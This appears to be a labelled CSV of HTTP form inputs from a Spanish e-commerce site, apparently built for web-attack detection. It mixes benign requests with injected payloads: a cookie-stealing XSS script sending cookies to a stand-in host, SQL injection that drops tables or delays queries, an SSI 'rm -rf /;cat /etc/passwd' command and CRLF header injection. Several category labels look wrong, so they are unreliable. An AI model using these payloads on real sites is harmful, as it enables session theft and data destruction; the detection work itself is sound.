payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority
entrar | settles8 | 1n02R20or | on/ | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
entrar | settles8 | 1n02R20or | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
"insertar | 5250 | Confirmar"" AND ""1""=""1 HTTP/1.1",cmd,no,48,1,0,0,1,medium
insertar | 5250 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
3 | Queso Manchego | 39 | 45 | sessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,174,1,1,0,1,low
entrar | ohma++ru | m893e787 | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | aiman | m893e787 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
insertar | 8699 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8699 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"entrar | sarene | 'cerebel',o | off | Entrar HTTP/1.1",cmd,no,53,1,0,0,1,medium
entrar | sarene | pROHIJamIenTo | off | Entrar HTTP/1.1,cmd,no,55,0,0,0,1,medium
insertar | 7334bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | Confirmar HTTP/1.1,cmd,no,100,0,0,0,1,low
insertar | 7334 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7334 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | ' DELETE FROM USERS | restitutorio | HuilliManque | Cure Lozana | nathenson1@sandrasummer.sy | 47051425A | C/ Lebrillo, 155, 4-A | Olmedo de Camaces | 44589 | Valladolid | 6933033673510667 | Registrar HTTP/1.1",cmd,no,220,1,0,0,1,low
"registro | logntp | restitutorio | HuilliManque | Cure Lozana | t@eomi@doceros@as.pk | 47051425A | C/ Lebrillo, 155, 4-A | Olmedo de Camaces | 44589 | Valladolid | 6933033673510667 | Registrar HTTP/1.1",cmd,no,201,0,0,0,1,low
"registro | logntp | restitutorio | HuilliManque | Cure Lozana | nathenson1@sandrasummer.sy | 47051425A | C/ Lebrillo, 155, 4-A | Olmedo de Camaces | 44589 | Valladolid | 6933033673510667 | Registrar HTTP/1.1",cmd,no,207,0,0,0,1,low
"entrar | lemmie | InteMPesTI+vo | ','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1",sql,no,96,1,0,0,1,low
entrar | lac+oss??e | InteMPesTI+vo | on | Entrar HTTP/1.1,cmd,no,58,0,0,0,1,medium
entrar | lemmie | InteMPesTI+vo | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | 8744 | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,cmd,no,91,0,0,0,1,low
insertar | 8744 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8744 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | viswa | 0sc9d25.2 | on/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | viswa | 0sc9d25.2 | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 9390 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 9390 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | cady | in59r/0o | off | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium
| | 1611 | Confirmar HTTP/1.1,cmd,no,29,0,0,0,1,high
insertar | 1611 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 1611 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | montijo | mane79 | Lihuen | Bibiloni Urdi | brion@baybay.gi | 00508069E | Gerona 89  | Olocau del Rey | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Valladolid | 2304911329453006 | Registrar HTTP/1.1,cmd,no,220,0,0,0,1,low
registro | montijo | mane79 | Lihuen | Bibiloni Urdi | brion@baybay.gi | 934A195AM | Gerona 89  | Olocau del Rey | 16122 | Valladolid | 2304911329453006 | Registrar HTTP/1.1,cmd,no,173,0,0,0,1,low
registro | montijo | mane79 | Lihuen | Bibiloni Urdi | brion@baybay.gi | 00508069E | Gerona 89  | Olocau del Rey | 16122 | Valladolid | 2304911329453006 | Registrar HTTP/1.1,cmd,no,173,0,0,0,1,low
entrar | yanshek | paros%22%20style=%22background:url(javascript:alert('Paros')) | off | Entrar HTTP/1.1,cmd,no,104,1,0,0,1,low
"entrar | yanshek | ,chufla | off | Entrar HTTP/1.1",cmd,no,50,0,0,0,1,medium
insertar | 5506 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5506 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | gedeon | 54r72il031o | Yuray | Montserrat Pugeo | jose_digges@blanquillos.aq | 45447133F | Carretera De Arcos, 174  | Aldeavieja de Tormes | 46890 | paros%22%20style=%22background:url(javascript:alert('Paros')) | 2175163155221209 | Registrar HTTP/1.1",cmd,no,261,1,0,0,1,low
"registro | gedeon | 54r72il031o | Yuray | Montserrat Pugeo | jose_digges@blanquillos.aq | 45447133F | Carretera De Arcos, 174  | Aldeavieja de Tormes | 46890 | Madrid | 2175163155221209 | Registrar HTTP/1.1",cmd,no,206,0,0,0,1,low
entrar | schlacht | 43s8a | off | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1,sql,no,107,1,0,0,1,low
entrar | schlacht | 43s8a | off/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | schlacht | 43s8a | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
"insertar | 8460 | "" AND ""1""=""1 HTTP/1.1",cmd,no,39,1,0,0,1,medium
insertar | 8460 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8460 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | shepard | cu61r8y4go | Dardo | Ilizaliturri Corominas | scheiwiller1@hangartalleres.pe | 44855164N | Calle Renaixenca, 26  | Robregordo | 2883A | Huelva | 5076436038006169 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
"registro | shepard | cu61r8y4go | Dardo | Ilizaliturri Corominas | scheiwiller1@hangartalleres.pe | 44855164N | Calle Renaixenca, 26  | Robregordo | 45410 | Huelva | 5076436038006169 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
entrar | ?p'*adiath | pi4179?r3fica | off | Entrar HTTP/1.1,cmd,no,59,1,0,0,1,medium
entrar | serge | pi4179?r3fica | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | 1517 | AND 1=1 HTTP/1.1,cmd,no,34,0,0,0,1,medium
insertar | 1517 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 1517 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
registro | jilann6 | inna | Hipabia | Salvatierra Escala | sangareau@faders.com.mil | 80061275T | Barriada De La Doctora 15  | Agaete | 23450 | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | 4825239492507549 | Registrar HTTP/1.1,cmd,no,238,0,0,0,1,low
"entrar | lorli | ene668,838,6 | on | Entrar HTTP/1.1",cmd,no,52,0,0,0,1,medium
entrar | lorli | GUipUscoaNO | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar | 7518 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7518 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
1 | Queso Manchego | 39 | 46 | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,cmd,no,104,0,0,0,1,low
entrar | kerianne | iN94n2t09E9tE | on/ | Entrar HTTP/1.1,cmd,no,57,0,0,0,1,medium
insertar | 8192 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8192 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"entrar | luc?ia/,ni | golfo | on | Entrar HTTP/1.1",cmd,no,50,0,0,0,1,medium
entrar | morton6 | golfo | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
2paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,encoded attack,no,71,1,0,0,0,medium
insertar | 90any%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | Pasar por caja HTTP/1.1,cmd,no,90,0,0,0,1,low
insertar | 90 | Confirmar/ HTTP/1.1,cmd,no,35,0,0,0,1,medium
insertar | 90 | Pasar por caja HTTP/1.1,cmd,no,39,0,0,0,1,medium
"registro | eamonn | 673que422 | Arador | Gala Vaquer | killorin@lodgeinmadrid.gl | 38367717Z | Grup De La Torre Lloveta 145  | Huerta de Rey | 31133 | Huesca | 5414663163826513 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1",sql,no,232,1,0,0,1,low
registro | eamonn | 673que422 | Arador | Gala Vaquer | killorin@lodgeinmadrid.gl | 38367717Z | Grup De La Torre Lloveta 145  | Huerta de Rey | 31133 | Huesca | 395765138055995A | Registrar HTTP/1.1,cmd,no,197,0,0,0,1,low
registro | eamonn | 673que422 | Arador | Gala Vaquer | killorin@lodgeinmadrid.gl | 38367717Z | Grup De La Torre Lloveta 145  | Huerta de Rey | 31133 | Huesca | 5414663163826513 | Registrar HTTP/1.1,cmd,no,197,0,0,0,1,low
3 | Vino Rioja | 100 | 20 | %00 HTTP/1.1,cmd,no,40,0,0,0,1,medium
entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | chaar | pe4ibl171o | on | Entrar HTTP/1.1,sql,no,114,1,0,0,1,low
'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | chaar | pe4ibl171o | on | Entrar HTTP/1.1,sql,no,108,1,0,0,1,low
entrar | chaar | pe4ibl171o | on | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 8434 | Confirmarsessionid=12312312& username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73 %63%72%69%70%74%3E? HTTP/1.1,cmd,no,382,0,0,0,1,low
insertar | 8434 | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,cmd,no,79,0,0,0,1,medium
insertar | 8434 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
"registro | montijo | remot4 | Mailena | Buj Andunce | griffel@camilafansite.pt | 93865245Zsessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> | Doctor Ulecia, 158  | Valdunquillo | 31498 | Tarragona | 5319876028160549 | Registrar HTTP/1.1",xss,no,321,1,1,0,1,low
"registro | montijo | remot4 | Mailena | Buj Andunce | griffel@camilafansite.pt | 93865245Z | Doctor Ulecia, 158  | Valdunquillo | 31498 | Tarragona | 5319876028160549 | Registrar HTTP/1.1",cmd,no,187,0,0,0,1,low
entrar | bateman | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 | on | Entrar HTTP/1.1,cmd,no,124,0,0,0,1,low
"entrar | bateman | ,6/c62pa1ad'7 | on | Entrar HTTP/1.1",cmd,no,55,1,0,0,1,medium
entrar | bateman | crucijada | on | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 7701 | Confirmar HTTP/1.1,sql,no,100,1,0,0,1,low
insertar | 7701 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 7701 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | scandret61 | 36no5i3 | Valquiria | Pelayo Petit | nabors.albalak@videotubo.mc | 18049190D | Camino Minguets 120, 2E | Valtajeros | 37777 | Sa+laman?ca | 2528225363434285 | Registrar HTTP/1.1",cmd,no,201,0,0,0,1,low
"registro | scandret61 | 36no5i3 | Valquiria | Pelayo Petit | nabors.albalak@videotubo.mc | 18049190D | Camino Minguets 120, 2E | Valtajeros | 37777 | Guadalajara | 2528225363434285 | Registrar HTTP/1.1",cmd,no,201,0,0,0,1,low
"registro | fleurima | sa924a9u25 | Ladislada | Aregall Picabea | ursitti@nightflight.dm | 88865484Q | Merced, 63  | Valdemierque | 08784 | S/alaman+c.a | 5240985649337180 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
entrar | elsa | permanecer | off | Entrarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,104,0,0,0,1,low
any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | elsa | permanecer | off | Entrar HTTP/1.1,cmd,no,95,0,0,0,1,low
entrar | elsa | permanecer | off/ | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium
entrar | elsa | permanecer | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar | 8506 | Pasar por caja? HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8506 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 8506 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | kassissi | chamizo | Reese | G-iuli*vo Ra,mallo | shale-rozsival1@ssextremadura.sm | 52920037G | C/ Juan De Zoyas 50, 1?H | Villafranca | 36450 | Teruel | 5175598912871065 | Registrar HTTP/1.1",cmd,no,203,0,0,0,1,low
"entrar | schute | co45amb,re5a | off | Entrar HTTP/1.1",cmd,no,54,0,0,0,1,medium
entrar | schute | superfic!ie | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
insertar | 5607 | 'OR'a='a HTTP/1.1,cmd,no,35,1,0,0,1,medium
insertar | 5607 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5607 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
entrar | kurose | 4en64t0 | off@40 | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
entrar | kurose | 4en64t0 | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
"insertar | 3858 | Pasar por caja<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> HTTP/1.1",sql,no,85,1,1,0,1,low
';waitfor delay '0:0:15';-- | 3858 | Pasar por caja HTTP/1.1,sql,no,60,1,0,0,1,medium
insertar | 3858 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | far | 5E13Er3 | Dardo | Marola | si@bunruang@sandra@summer.uk | 87896249R | Puente De La Ribera 191,  | Sineu | 37256 | Burgos | 4819220729146482 | Registrar HTTP/1.1",cmd,no,177,0,0,0,1,low
registro | chihhua | iRi4ArAND 1=1 | Hebert | Fonts Westermeier | hemmings_vos@programasalquilermaquinaria.ag | 55492932G | C/ Bazan 184 4?A | Garcia | 10812 | Soria | 2183980302594165 | Registrar HTTP/1.1,cmd,no,205,0,0,0,1,low
registro | chihhua | iRi4Ar | /Veanella | Fonts Westermeier | hemmings_vos@programasalquilermaquinaria.ag | 55492932G | C/ Bazan 184 4?A | Garcia | 10812 | Soria | 2183980302594165 | Registrar HTTP/1.1,cmd,no,201,0,0,0,1,low
registro | chihhua | iRi4Ar | Hebert | Fonts Westermeier | hemmings_vos@programasalquilermaquinaria.ag | 55492932G | C/ Bazan 184 4?A | Garcia | 10812 | Soria | 2183980302594165 | Registrar HTTP/1.1,cmd,no,198,0,0,0,1,low
entrar | lussier | 1Ch?U07l6A | off | paros%22%20style=%22background:url(javascript:alert('Paros')) HTTP/1.1,cmd,no,108,1,0,0,1,low
entrar | lussier | 1Ch?U07l6A | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium
insertar | 8223 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 8223 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | asops | s/974/0,N2 | Gala | Altamira Ferro | gate@introito.cc | 76543761Z | La Torre 122  | Padul | 19336 | Valladolid | 6279584819907955 | Registrar HTTP/1.1",cmd,no,169,0,0,0,1,low
registro | asops | 4ligeramiento | Gala | Altamira Ferro | gate@introito.cc | 76543761Z | La Torre 122  | Padul | 19336 | Valladolid | 6279584819907955 | Registrar HTTP/1.1,cmd,no,172,0,0,0,1,low
entrar | faez| | 9fi247A | on | Entrar HTTP/1.1,cmd,no,47,0,0,0,1,medium
"entrar | faez | 9fi247A | ','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1",sql,no,88,1,0,0,1,low
"entrar | faez | e0carme7tad,a | on | Entrar HTTP/1.1",cmd,no,52,0,0,0,1,medium
entrar | faez | 9fi247A | on | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium
insertar | 2026 | Confirmarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 HTTP/1.1,cmd,no,90,0,0,0,1,low
insertar | %3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Confirmar HTTP/1.1,cmd,no,84,0,0,0,1,low
insertar | 2026 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
registro | mulroney | des4718o | Fares | Osa Matiz | lahiri@martosfutbolsala.mk | 96676664M | Calle Juan Correa De Vivar 38 1?F | Cueva del Hierro | 34127 | Navarra | 291239717167592A | Registrar HTTP/1.1,cmd,no,204,0,0,0,1,low
registro | mulroney | des4718o | Fares | Osa Matiz | lahiri@martosfutbolsala.mk | 96676664M | Calle Juan Correa De Vivar 38 1?F | Cueva del Hierro | 34127 | Navarra | 2893190534674100 | Registrar HTTP/1.1,cmd,no,204,0,0,0,1,low
"entrar | girouard | Disgu5TAd1','0','0','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1",sql,no,94,1,0,0,1,low
entrar | girouard | Disgu5TAd1 | off | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
any%3F%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 4388 | Pasar por caja HTTP/1.1,cmd,no,84,0,0,0,1,low
insertar | 4388 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | zadow | alternaci-59 | Gyana | /Bullones Masnou | bushell@sayuela.uk | 23485919K | C/ Juan Ii, 108 12?C | Inviernas, Las | 37428 | Tarragona | 0299500452895556 | Registrar HTTP/1.1",cmd,no,191,0,0,0,1,low
"registro | zadow | alternaci-59 | Gyana | Farell Lattuf | bushell@sayuela.uk | 23485919K | C/ Juan Ii, 108 12?C | Inviernas, Las | 37428 | Tarragona | 0299500452895556 | Registrar HTTP/1.1",cmd,no,188,0,0,0,1,low
entrar | whey-min | r.apaz | on/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | whey-min | r.apaz | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
insertar%7C | 9823 | Confirmar HTTP/1.1,cmd,no,39,0,0,0,1,medium
insertar | 9823 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
"registro | doerr | 8osqu85a7 | Remy | Tauler Sa-l-inero | akadeth_svojtka@privatebanking.com.pe | 98300353D | Calle Equador 86,  | Sant Cugat Sesgarrigues | 17001 | Burgos | 9853640605253421 | Registrar HTTP/1.1",cmd,no,211,0,0,0,1,low
entrar | adebayo | pedral | Entrar HTTP/1.1,cmd,no,43,0,0,0,1,medium
entrar | adebayo | pedral | off/ | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium
entrar | adebayo | pedral | off | Entrar HTTP/1.1,cmd,no,49,0,0,0,1,medium
insertar' DELETE FROM USERS | 5781 | Pasar por caja HTTP/1.1,cmd,no,60,1,0,0,1,medium
insertar | 5781 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5781 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | junkie | 5arin3-ro | Sol | Ferrada Montull | macnee-voringer@b-sign.sb | 61302831B | C/ Timoteo Martin, 24 7?G%20 | Quintanilla de Arriba | 49639 | Barcelona | 6741458111555390 | Registrar HTTP/1.1",cmd,no,208,0,0,0,1,low
"registro | junkie | 5arin3-ro | %3F | Ferrada Montull | macnee-voringer@b-sign.sb | 61302831B | C/ Timoteo Martin, 24 7?G | Quintanilla de Arriba | 49639 | Barcelona | 6741458111555390 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
"registro | junkie | 5arin3-ro | Sol | Ferrada Montull | macnee-voringer@b-sign.sb | 61302831B | C/ Timoteo Martin, 24 7?G | Quintanilla de Arriba | 3771A | Barcelona | 6741458111555390 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
"registro | junkie | 5arin3-ro | Sol | Ferrada Montull | macnee-voringer@b-sign.sb | 61302831B | C/ Timoteo Martin, 24 7?G | Quintanilla de Arriba | 49639 | Barcelona | 6741458111555390 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
insertar | 5029 | @40 HTTP/1.1,cmd,no,30,0,0,0,1,medium
insertar | 5029 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium
insertar | 5029 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
entrar | heleen%2B | castella8ismo | on | Entrar HTTP/1.1,cmd,no,57,0,0,0,1,medium
entrar | heleen | gEnIa'lMEntE | on | Entrar HTTP/1.1,cmd,no,53,1,0,0,1,medium
entrar | heleen | castella8ismo | on | Entrar HTTP/1.1,cmd,no,54,0,0,0,1,medium
insertar | %20 | Confirmar HTTP/1.1,cmd,no,35,0,0,0,1,medium
insertar | 7767 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 7767 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
"registro | jamilahbob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org | e0f2n87a | Virma | Duch Vilarnau | rosamond_aloyshina@videospornocaseros.aq | 84711932B | Alfredo Donay 178,  | Casas del Monte | 17650 | Toledo | 7712379186246495 | Registrar HTTP/1.1",xss,no,253,0,1,0,1,low
"registro | jamilah | | | Virma | Duch Vilarnau | rosamond_aloyshina@videospornocaseros.aq | 84711932B | Alfredo Donay 178,  | Casas del Monte | 17650 | Toledo | 7712379186246495 | Registrar HTTP/1.1",cmd,no,198,0,0,0,1,low
"registro | jamilah | e0f2n87a | Virma | Duch Vilarnau | rosamond_aloyshina@videospornocaseros.aq | 84711932B | Alfredo Donay 178,  | Casas del Monte | 17650 | Za./ragoza | 7712379186246495 | Registrar HTTP/1.1",cmd,no,209,0,0,0,1,low
"registro | jamilah | e0f2n87a | Virma | Duch Vilarnau | rosamond_aloyshina@videospornocaseros.aq | 84711932B | Alfredo Donay 178,  | Casas del Monte | 17650 | Toledo | 7712379186246495 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
entrarSet-cookie%3A+Tamper%3D1041264011025374727 | kuchinsk | rogadora | off | Entrar HTTP/1.1,cmd,no,94,0,0,0,1,low
entrar | kuchinsk | rogadora | off | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,cmd,no,110,0,0,0,1,low
"entrar | kuchinsk | b*58TO76A',na | off | Entrar HTTP/1.1",cmd,no,57,1,0,0,1,medium
entrar | kuchinsk | rogadora | off | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
"insertar | 622<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | Pasar por caja HTTP/1.1",sql,no,84,1,1,0,1,low
');waitfor delay '0:0:15';-- | 622 | Pasar por caja HTTP/1.1,sql,no,60,1,0,0,1,medium
insertar | 622 | Confirmar/ HTTP/1.1,cmd,no,36,0,0,0,1,medium
insertar | 622 | Pasar por caja HTTP/1.1,cmd,no,40,0,0,0,1,medium
entrar | rizzardi | 332G3le8a | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1,sql,no,114,1,0,0,1,low
entrar | rizzardi | 332G3le8a | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium
"insertar<SCRIPT>alert(""Paros"");</SCRIPT> | 1700 | Pasar por caja HTTP/1.1",xss,no,73,1,1,0,1,medium
insertar | 1700 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 1700 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium
"registro | legolas | Z5R872Car5E | Helvecia | Fuensalida Liuzzi | stoichkov@spainpharma.st | 70101170E | Calle Comte De Barcelona 140,  | Barracas | 17857 | Palenciaany%0D%0ASet-cookie%3A+Tamper%3D5765205567234876235 | 6931646496457653 | Registrar HTTP/1.1",cmd,no,256,0,0,0,1,low
registro | legolas | Z5R872Car5E | Helvecia | Fuensalida Liuzzi | stoichkov@spainpharma.st | 70101170E | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Barracas | 17857 | Palencia | 6931646496457653 | Registrar HTTP/1.1,cmd,no,229,0,0,0,1,low
"registro | legolas | Z5R872Car5E | Helvecia | Fuensalida Liuzzi | stoichkov@spainpharma.st | 612'947AD | Calle Comte De Barcelona 140,  | Barracas | 17857 | Palencia | 6931646496457653 | Registrar HTTP/1.1",cmd,no,205,1,0,0,1,low
"registro | legolas | Z5R872Car5E | Helvecia | Fuensalida Liuzzi | stoichkov@spainpharma.st | 70101170E | Calle Comte De Barcelona 140,  | Barracas | 17857 | Palencia | 6931646496457653 | Registrar HTTP/1.1",cmd,no,205,0,0,0,1,low
"registro','0','0');waitfor delay '0:0:15';-- | gerhardt8 | pizmie+nta | Yamila | Cardalliaguet Yescas | armantel@laspruebascongaseosa.vg | 65724136A | Castro Canseco 8 5?H | Oria | 17538 | Albacete | 2877016523183053 | Registrar HTTP/1.1",sql,no,237,1,0,0,1,low
registro | gerhardt8 | pizmie+nta | Yamila | Cardalliaguet Yescas | armantel@laspruebascongaseosa.vg | 65724136A | bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org | Oria | 17538 | Albacete | 2877016523183053 | Registrar HTTP/1.1,cmd,no,245,0,0,0,1,low
registro | gerhardt8 | pizmie+nta | Yamila | Cardalliaguet Yescas | armantel@laspruebascongaseosa.vg | 65724136A | Castro Canseco 8 5?H | Oria | 4351A | Albacete | 2877016523183053 | Registrar HTTP/1.1,cmd,no,201,0,0,0,1,low
registro | gerhardt8 | pizmie+nta | Yamila | Cardalliaguet Yescas | armantel@laspruebascongaseosa.vg | 65724136A | Castro Canseco 8 5?H | Oria | 17538 | Albacete | 2877016523183053 | Registrar HTTP/1.1,cmd,no,201,0,0,0,1,low
insertar | 5906 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium
insertar | 5906 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium
